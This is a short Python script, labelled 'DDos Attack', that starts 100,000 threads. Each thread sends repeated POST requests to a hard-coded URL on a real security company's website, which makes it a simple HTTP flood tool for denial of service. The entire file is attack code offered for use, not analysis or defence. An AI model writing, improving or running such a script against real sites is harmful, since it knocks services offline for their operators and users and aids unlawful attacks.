import requests
import threading


print("1. DDos Attack\n")
#Variables
Choice = input("Enter your choice: ")
Data = {"Key": "ABCDEFGHIJKLMNOPQRSTUVWXYZ"}
Host = "https://www.redwolfsecurity.com/services/"

def DDosAttack():
    try:

        response = requests.post(Host, data=Data)
        print(f"The status is: {response.status_code}")

    except Exception as e:
        print(f"Error: {e}")
threads = []
match Choice:
    case "1":
        for _ in range(100000):
            thread = threading.Thread(target=DDosAttack)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
            
